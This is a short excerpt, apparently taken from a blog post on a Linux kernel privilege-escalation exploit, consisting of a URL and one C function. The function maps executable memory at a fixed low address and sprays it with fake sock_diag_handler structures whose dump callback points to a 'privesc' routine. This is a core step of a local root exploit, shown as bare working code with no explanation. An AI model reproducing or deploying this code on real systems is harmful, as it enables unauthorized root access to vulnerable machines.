http://blog.plenz.com/2013-02/privilege-escalation-kernel-exploit.html

```c
void spray_fake_handler(const void *addr)
{
    void *pp;
    int po;

    /* align to page boundary */
    pp = (void *) ((ulong)addr & ~0xfffULL);

    pp = mmap(pp, 0x10000, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if(pp == MAP_FAILED)
        err(-1, "mmap");

    struct sock_diag_handler hndl = { .family = AF_INET, .dump = privesc };
    for(po = 0; po < 0x10000; po += sizeof(hndl))
        memcpy(pp + po, &hndl, sizeof(hndl));
}
```

